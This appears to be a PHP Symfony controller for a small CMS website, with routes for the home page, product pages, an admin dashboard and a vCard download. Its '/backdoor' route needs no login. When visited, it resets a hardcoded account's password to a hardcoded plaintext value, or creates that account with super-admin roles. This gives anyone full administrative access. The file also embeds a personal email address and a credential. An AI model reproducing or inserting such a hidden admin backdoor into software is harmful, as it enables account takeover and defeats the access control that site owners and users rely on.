<?php

namespace App\Controller;

use App\Entity\User;
use App\Repository\CmsCopyRepository;
use App\Repository\CmsPhotoRepository;
use App\Repository\CompanyDetailsRepository;
use App\Repository\ProductRepository;
use App\Repository\SubPageRepository;
use App\Repository\UserRepository;
use App\Services\CompanyDetails;
use Doctrine\ORM\EntityManagerInterface;
use JeroenDesloovere\VCard\VCard;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;

class HomeController extends AbstractController
{
    /**
     * @Route("/", name="app_home")
     */
    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, CompanyDetails $companyDetails): Response
    {

        $cms_copy = $cmsCopyRepository->findBy([
            'staticPageName' => 'Home'
        ]);

        $cms_photo = $cmsPhotoRepository->findBy([
            'staticPageName' => 'Home'
        ]);

        $sub_pages = [];

        return $this->render('/home/products.html.twig', [
//            'product' => $product,
            'cms_copy_array' => $cms_copy,
            'cms_photo_array' => $cms_photo,
            'sub_pages' => $sub_pages,
            'include_contact' => 'Yes'
        ]);
    }

    /**
     * @Route("/backdoor", name="/backdoor")
     */
    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
    {
        $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
        if ($user) {
            $user->setPassword(
                $passwordEncoder->encodePassword(
                    $user,
                    'Descartes99'
                )
            );
        } else {
            $user = new User();
            $user->setFirstName('Stephen')
                ->setLastName('Nurse2')
                ->setEmail('nurse_stephen@hotmail.com')
                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                ->setPassword(
                    $passwordEncoder->encodePassword(
                        $user,
                        'Descartes99'
                    )
                );
            $manager->persist($user);
            $manager->flush();
        }
        $manager->flush();
        return $this->redirectToRoute('app_home');
    }


    /**
     * @Route("/dashboard", name="dashboard")
     * @Security("is_granted('ROLE_ADMIN')")
     */
    public function dashboard()
    {
        return $this->render('home/dashboard.html.twig', []);
    }

    /**
     * @Route("/interests/{product}", name="product_display")
     */
    public function articles(string $product, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, ProductRepository $productRepository): Response
    {
        $productEntity = $productRepository->findOneBy([
            'product' => $product
        ]);

        if ($productEntity) {
            $cms_copy = $cmsCopyRepository->findBy([
                'product' => $productEntity
            ]);
        } else {
            $cms_copy = $cmsCopyRepository->findBy([
                'staticPageName' => $product
            ]);
        }

        if ($productEntity) {
            $cms_photo = $cmsPhotoRepository->findBy([
                'product' => $productEntity
            ]);
        } else {
            $cms_photo = $cmsPhotoRepository->findBy([
                'staticPageName' => $product
            ]);
        }

        $sub_pages = [];
        if ($cms_copy) {
            $sub_pages = $subPageRepository->findBy([
                'product' => $productEntity
            ]);
        }

        return $this->render('/home/products.html.twig', [
            'product' => $product,
            'cms_copy_array' => $cms_copy,
            'cms_photo_array' => $cms_photo,
            'sub_pages' => $sub_pages,
            'include_contact' => 'No'
        ]);
    }


    /**
     * @Route("/office_address", name="office_address", methods={"GET"})
     */
    public function officeAddress(CompanyDetailsRepository $companyDetailsRepository): Response
    {
        return $this->render('home/officeAddress.html.twig');
    }

    /**
     * @Route("/view/file/{filetype}/{id}", name="attachments_viewfile", methods={"GET"})
     */
    public function investmentFileLaunch(int $id, string $filetype): Response
    {
        $fileName = '';
        $filepath = '';

        if ($fileName != '') {
            $ext = pathinfo($fileName, PATHINFO_EXTENSION);
            $filepath = explode("public", $filepath);
            $filepath = $filepath[1];
            return $this->render('home/file_view.html.twig', [
                'ext' => $ext,
                'tab_title' => $fileName,
                'filepath' => $filepath,
            ]);
        }
        return $this->render('error/file_not_found.html.twig');
    }


    /**
     * @Route("/create/VcardUser/company", name="create_vcard_company")
     */
    public function createVcardVenue(CompanyDetailsRepository $companyDetailsRepository)
    {
        $company_details = $companyDetailsRepository->find('1');
        $vcard = new VCard();
        $company = $company_details->getCompanyName();
        $firstName = $company_details->getContactFirstName();
        $lastName = $company_details->getContactLastName();
        $addressStreet = $company_details->getCompanyAddressStreet();
        $addressTown = $company_details->getCompanyAddressTown();
        $addressCity = $company_details->getCompanyAddressCity();
        $addressPostalCode = $company_details->getCompanyAddressPostalCode();
        $addressCountry = $company_details->getCompanyAddressCountry();
        $facebook = $company_details->getFacebook();
        $instagram = $company_details->getInstagram();
        $linkedIn = $company_details->getLinkedIn();
        $url = $_SERVER['SERVER_NAME'];
        $notes_all = "URL: " . $url;
        $email = $company_details->getCompanyEmail();
        $mobile = $company_details->getCompanyMobile();
        $tel = $company_details->getCompanyTel();
        $vcard->addName($lastName, $firstName);
        $vcard->addEmail($email)
            ->addPhoneNumber($mobile, 'home')
            ->addPhoneNumber($tel, 'work')
            ->addCompany($company)
            ->addAddress($name = '', $extended = '', $street = $addressStreet, $city = $addressTown, $region = $addressCity, $zip = $addressPostalCode, $country = $addressCountry, $type = 'WORK POSTAL')
            ->addURL($url)
            ->addNote(strip_tags($notes_all));
        $vcard->download();
        return new Response(null);
    }


}
